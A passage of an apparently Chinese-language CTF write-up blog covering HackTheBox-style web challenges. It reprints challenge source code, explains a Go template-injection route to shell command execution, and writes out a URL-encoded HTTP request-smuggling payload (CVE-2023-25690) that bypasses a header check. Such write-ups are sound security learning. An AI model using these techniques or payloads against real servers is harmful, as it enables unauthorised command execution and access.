shell，注意这样只能在本地才行</p>\n<h3 id=\"renderquest\"><a class=\"anchor\" href=\"#renderquest\">#</a> RenderQuest</h3>\n<p>很棒的一题，这题让我理解了一下 golang 的模板渲染，首先查看 main.go 代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import (</span><br><span class=\"line\">\t&quot;encoding/json&quot;</span><br><span class=\"line\">\t&quot;fmt&quot;</span><br><span class=\"line\">\t&quot;html/template&quot;</span><br><span class=\"line\">\t&quot;io&quot;</span><br><span class=\"line\">\t&quot;net/http&quot;</span><br><span class=\"line\">\t&quot;os&quot;</span><br><span class=\"line\">\t&quot;os/exec&quot;</span><br><span class=\"line\">\t&quot;path/filepath&quot;</span><br><span class=\"line\">\t&quot;strings&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">const WEB_PORT = &quot;1337&quot;</span><br><span class=\"line\">const TEMPLATE_DIR = &quot;./templates&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">type LocationInfo struct &#123;</span><br><span class=\"line\">\tIpVersion     int     `json:&quot;ipVersion&quot;`</span><br><span class=\"line\">\tIpAddress     string  `json:&quot;ipAddress&quot;`</span><br><span class=\"line\">\tLatitude      float64 `json:&quot;latitude&quot;`</span><br><span class=\"line\">\tLongitude     float64 `json:&quot;longitude&quot;`</span><br><span class=\"line\">\tCountryName   string  `json:&quot;countryName&quot;`</span><br><span class=\"line\">\tCountryCode   string  `json:&quot;countryCode&quot;`</span><br><span class=\"line\">\tTimeZone      string  `json:&quot;timeZone&quot;`</span><br><span class=\"line\">\tZipCode       string  `json:&quot;zipCode&quot;`</span><br><span class=\"line\">\tCityName      string  `json:&quot;cityName&quot;`</span><br><span class=\"line\">\tRegionName    string  `json:&quot;regionName&quot;`</span><br><span class=\"line\">\tContinent     string  `json:&quot;continent&quot;`</span><br><span class=\"line\">\tContinentCode string  `json:&quot;continentCode&quot;`</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">type MachineInfo struct &#123;</span><br><span class=\"line\">\tHostname      string</span><br><span class=\"line\">\tOS            string</span><br><span class=\"line\">\tKernelVersion string</span><br><span class=\"line\">\tMemory        string</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">type RequestData struct &#123;</span><br><span class=\"line\">\tClientIP     string</span><br><span class=\"line\">\tClientUA     string</span><br><span class=\"line\">\tServerInfo   MachineInfo</span><br><span class=\"line\">\tClientIpInfo LocationInfo `json:&quot;location&quot;`</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func (p RequestData) FetchServerInfo(command string) string &#123;</span><br><span class=\"line\">\tout, err := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command).Output()</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn string(out)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func (p RequestData) GetLocationInfo(endpointURL string) (*LocationInfo, error) &#123;</span><br><span class=\"line\">\tresp, err := http.Get(endpointURL)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn nil, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdefer resp.Body.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\tif resp.StatusCode != http.StatusOK &#123;</span><br><span class=\"line\">\t\treturn nil, fmt.Errorf(&quot;HTTP request failed with status code: %d&quot;, resp.StatusCode)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tbody, err := io.ReadAll(resp.Body)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn nil, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tvar locationInfo LocationInfo</span><br><span class=\"line\">\tif err := json.Unmarshal(body, &amp;locationInfo); err != nil &#123;</span><br><span class=\"line\">\t\treturn nil, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn &amp;locationInfo, nil</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func isSubdirectory(basePath, path string) bool &#123;</span><br><span class=\"line\">\trel, err := filepath.Rel(basePath, path)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn false</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn !strings.HasPrefix(rel, &quot;..&quot;+string(filepath.Separator))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func readFile(filepath string, basePath string) (string, error) &#123;</span><br><span class=\"line\">\tif !isSubdirectory(basePath, filepath) &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, fmt.Errorf(&quot;Invalid filepath&quot;)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdata, err := os.ReadFile(filepath)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn string(data), nil</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func readRemoteFile(url string) (string, error) &#123;</span><br><span class=\"line\">\tresponse, err := http.Get(url)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdefer response.Body.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\tif response.StatusCode != http.StatusOK &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, fmt.Errorf(&quot;HTTP request failed with status code: %d&quot;, response.StatusCode)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tcontent, err := io.ReadAll(response.Body)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn string(content), nil</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func getIndex(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class=\"line\">\thttp.Redirect(w, r, &quot;/render?page=index.tpl&quot;, http.StatusMovedPermanently)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func getTpl(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class=\"line\">\tvar page string = r.URL.Query().Get(&quot;page&quot;)</span><br><span class=\"line\">\tvar remote string = r.URL.Query().Get(&quot;use_remote&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">\tif page == &quot;&quot; &#123;</span><br><span class=\"line\">\t\thttp.Error(w, &quot;Missing required parameters&quot;, http.StatusBadRequest)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treqData := &amp;RequestData&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tuserIPCookie, err := r.Cookie(&quot;user_ip&quot;)</span><br><span class=\"line\">\tclientIP := &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif err == nil &#123;</span><br><span class=\"line\">\t\tclientIP = userIPCookie.Value</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\tclientIP = strings.Split(r.RemoteAddr, &quot;:&quot;)[0]</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tuserAgent := r.Header.Get(&quot;User-Agent&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocationInfo, err := reqData.GetLocationInfo(&quot;https://freeipapi.com/api/json/&quot; + clientIP)</span><br><span class=\"line\"></span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\tfmt.Println(err)</span><br><span class=\"line\">\t\thttp.Error(w, &quot;Could not fetch IP location info&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treqData.ClientIP = clientIP</span><br><span class=\"line\">\treqData.ClientUA = userAgent</span><br><span class=\"line\">\treqData.ClientIpInfo = *locationInfo</span><br><span class=\"line\">\treqData.ServerInfo.Hostname = reqData.FetchServerInfo(&quot;hostname&quot;)</span><br><span class=\"line\">\treqData.ServerInfo.OS = reqData.FetchServerInfo(&quot;cat /etc/os-release | grep PRETTY_NAME | cut -d &#x27;\\&quot;&#x27; -f 2&quot;)</span><br><span class=\"line\">\treqData.ServerInfo.KernelVersion = reqData.FetchServerInfo(&quot;uname -r&quot;)</span><br><span class=\"line\">\treqData.ServerInfo.Memory = reqData.FetchServerInfo(&quot;free -h | awk &#x27;/^Mem/&#123;print $2&#125;&#x27;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">\tvar tmplFile string</span><br><span class=\"line\"></span><br><span class=\"line\">\tif remote == &quot;true&quot; &#123;</span><br><span class=\"line\">\t\ttmplFile, err = readRemoteFile(page)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif err != nil &#123;</span><br><span class=\"line\">\t\t\thttp.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\t\treturn</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\ttmplFile, err = readFile(TEMPLATE_DIR+&quot;/&quot;+page, &quot;./&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif err != nil &#123;</span><br><span class=\"line\">\t\t\thttp.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\t\treturn</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\ttmpl, err := template.New(&quot;page&quot;).Parse(tmplFile)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\thttp.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\terr = tmpl.Execute(w, reqData)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\thttp.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">\tmux := http.NewServeMux()</span><br><span class=\"line\"></span><br><span class=\"line\">\tmux.HandleFunc(&quot;/&quot;, getIndex)</span><br><span class=\"line\">\tmux.HandleFunc(&quot;/render&quot;, getTpl)</span><br><span class=\"line\">\tmux.Handle(&quot;/static/&quot;, http.StripPrefix(&quot;/static/&quot;, http.FileServer(http.Dir(&quot;static&quot;))))</span><br><span class=\"line\"></span><br><span class=\"line\">\tfmt.Println(&quot;Server started at port &quot; + WEB_PORT)</span><br><span class=\"line\">\thttp.ListenAndServe(&quot;:&quot;+WEB_PORT, mux)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>其他的不看光看调用包就可以找到我们需要的漏洞，import 了一个 os 并且在</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func (p RequestData) FetchServerInfo(command string) string &#123;</span><br><span class=\"line\">\tout, err := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command).Output()</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn string(out)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里调用了一个 exec.Command 并且是调用的 sh -c 就是命令执行的意思，</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You&#x27;ve found a website that lets you input remote templates for rendering. Your task is to exploit this system&#x27;s vulnerabilities to access and retrieve a hidden flag. Good luck!</span><br></pre></td></tr></table></figure></p>\n<p>这里也说明了模板渲染，那抓包查看下面的<img data-src=\"/pic/image-20231210145451007.png\" alt=\"image-20231210145451007\" /></p>\n<p>这个页面的下面还能跳转我们要的网页，</p>\n<p><img data-src=\"/pic/image-20231210145537106.png\" alt=\"image-20231210145537106\" /></p>\n<p>这里使用的抓包可以知道 use_remote=true 并且 page 就是你需要立即渲染的地方，因为内网 ip 无法访问那么我们可以使用 webhook.site 来生成需要的内容接取</p>\n<p><img data-src=\"/pic/image-20231210145732624.png\" alt=\"image-20231210145732624\" /></p>\n<p>这里调用了.FetchServerInfo 来直接执行命令，因为我们的目标就是这个</p>\n<p><img data-src=\"/pic/image-20231210145837130.png\" alt=\"image-20231210145837130\" /></p>\n<p>命令执行成功，达到目的</p>\n<h3 id=\"apacheblaze\"><a class=\"anchor\" href=\"#apacheblaze\">#</a> ApacheBlaze</h3>\n<p>Step into the ApacheBlaze universe, a world of arcade clicky games. Rumor has it that by playing certain games, you have the chance to win a grand prize. However, before you can dive into the fun, you'll need to crack a puzzle.</p>\n<p>这个题打的我很懵</p>\n<p>我看了一下 app.py 里面的代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask, request, jsonify</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">app.config[&#x27;GAMES&#x27;] = &#123;&#x27;magic_click&#x27;, &#x27;click_mania&#x27;, &#x27;hyper_clicker&#x27;, &#x27;click_topia&#x27;&#125;</span><br><span class=\"line\">app.config[&#x27;FLAG&#x27;] = &#x27;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class=\"line\">def index():</span><br><span class=\"line\">    game = request.args.get(&#x27;game&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    if not game:</span><br><span class=\"line\">        return jsonify(&#123;</span><br><span class=\"line\">            &#x27;error&#x27;: &#x27;Empty game name is not supported!.&#x27;</span><br><span class=\"line\">        &#125;), 400</span><br><span class=\"line\"></span><br><span class=\"line\">    elif game not in app.config[&#x27;GAMES&#x27;]:</span><br><span class=\"line\">        return jsonify(&#123;</span><br><span class=\"line\">            &#x27;error&#x27;: &#x27;Invalid game name!&#x27;</span><br><span class=\"line\">        &#125;), 400</span><br><span class=\"line\"></span><br><span class=\"line\">    elif game == &#x27;click_topia&#x27;:</span><br><span class=\"line\">        if request.headers.get(&#x27;X-Forwarded-Host&#x27;) == &#x27;dev.apacheblaze.local&#x27;:</span><br><span class=\"line\">            return jsonify(&#123;</span><br><span class=\"line\">                &#x27;message&#x27;: f&#x27;&#123;app.config[&quot;FLAG&quot;]&#125;&#x27;</span><br><span class=\"line\">            &#125;), 200</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            return jsonify(&#123;</span><br><span class=\"line\">                &#x27;message&#x27;: &#x27;This game is currently available only from dev.apacheblaze.local.&#x27;</span><br><span class=\"line\">            &#125;), 200</span><br><span class=\"line\"></span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return jsonify(&#123;</span><br><span class=\"line\">            &#x27;message&#x27;: &#x27;This game is currently unavailable due to internal maintenance.&#x27;</span><br><span class=\"line\">        &#125;), 200</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>还以为常规方法只要 game<mark>click_topia，以及 X-Forwarded-Host</mark>dev.apacheblaze.local 就能拿到 flag，是我大意了，试了一会发现根本出不了 flag，又去查看了一下 api.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$(document).ready(function() &#123;</span><br><span class=\"line\">  $(&quot;.game a&quot;).click(function(event) &#123;</span><br><span class=\"line\">      event.preventDefault();</span><br><span class=\"line\">      var gameName = $(this).attr(&quot;div&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">      $.ajax(&#123;</span><br><span class=\"line\">          url: &quot;/api/games/&quot; + gameName,</span><br><span class=\"line\">          success: function(data) &#123;</span><br><span class=\"line\">              var message = data.message;</span><br><span class=\"line\">              $(&quot;#gameplayresults&quot;).text(message);</span><br><span class=\"line\">          &#125;,</span><br><span class=\"line\">          error: function() &#123;</span><br><span class=\"line\">              $(&quot;#gameplayresults&quot;).text(&quot;Error fetching API data.&quot;);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>查看到了里面有个 url: &quot;/api/games/&quot; + gameName, 我想到了 gameName 换成 click_topia 然后提示 app.py 里面的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">return jsonify(&#123;</span><br><span class=\"line\">               &#x27;message&#x27;: &#x27;This game is currently available only from dev.apacheblaze.local.&#x27;</span><br><span class=\"line\">           &#125;), 200</span><br></pre></td></tr></table></figure></p>\n<p>加上 X-Forwarded-Host==dev.apacheblaze.local 还是没有反应，试了很久发现还是不行，查看了大佬的 wp 发现我方法错了</p>\n<p><img data-src=\"/pic/image-20231210153436785.png\" alt=\"image-20231210153436785\" /></p>\n<p>应该向去查看 httpd.conf 的语法，里面有一个重定向，并且还设置了一个 proxy 也就说说我刚刚上面那两个其实都是一个，现在很清楚了，端口 1337 和 8080 上的 2 个虚拟主机（反向代理和负载均衡器）在请求处理期间被附加到 X-Forwarded-Host 标头。</p>\n<p>并且大佬还说了利用方法 HTTP 请求走私攻击 (CVE-2023–25690)</p>\n<p>通过这个漏洞，我们了解到我们可以在发送到目标的第一个请求中隐藏第二个请求（使用 <code>\\r\\n\\r</code>  拆分方法）。这使我们能够直接从反向代理发送请求，因此我们不会将其他内容附加到 X-Forwarded-Host 标头的末尾</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /api/games/click_topia HTTP/1.1</span><br><span class=\"line\">主机：dev.apacheblaze.local </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET / HTTP/1.1</span><br><span class=\"line\">主机：localhost:1337 </span><br><span class=\"line\"></span><br><span class=\"line\">-------------------------- ------------</span><br><span class=\"line\"></span><br><span class=\"line\">编码提醒: </span><br><span class=\"line\"></span><br><span class=\"line\">\\r\\n -&gt; %0d%0a </span><br><span class=\"line\">\\r\\n\\r -&gt; %0d%0a%0d</span><br></pre></td></tr></table></figure></p>\n<p>进行 url 编码</p>\n<p><img data-src=\"/pic/image-20231210154202586.png\" alt=\"image-20231210154202586\" /></p>\n<p>需要注意的是进行常规的 url 编码后无法编码 %0d 需要自己加上去最后是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/ HTTP/1.1</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"proxyasaservice\"><a class=\"anchor\" href=\"#proxyasaservice\">#</a> ProxyAsAService</h3>\n<p>Experience the freedom of the web with ProxyAsAService. Because online privacy and access should be for everyone, everywhere.</p>\n<p>这个题又是一个 python 写的，题目描述了代理我们一个一个文件开始看</p>\n<p>首先是 dockerfiler</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">EXPOSE 1337</span><br><span class=\"line\">ENV FLAG=HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;</span><br></pre></td></tr></table></figure></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1hcHAtMGg5ZHFxNjl3dmxweTBzM3Z3OHFwLnB5\">然后就是代码了 app.py</span></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask, jsonify</span><br><span class=\"line\">from application.blueprints.routes import proxy_api, debug</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.config.from_object(&#x27;application.config.Config&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">app.register_blueprint(proxy_api, url_prefix=&#x27;/&#x27;)</span><br><span class=\"line\">app.register_blueprint(debug, url_prefix=&#x27;/debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">@app.errorhandler(404)</span><br><span class=\"line\">def not_found(error):</span><br><span class=\"line\">    return jsonify(&#123;&#x27;error&#x27;: &#x27;Not 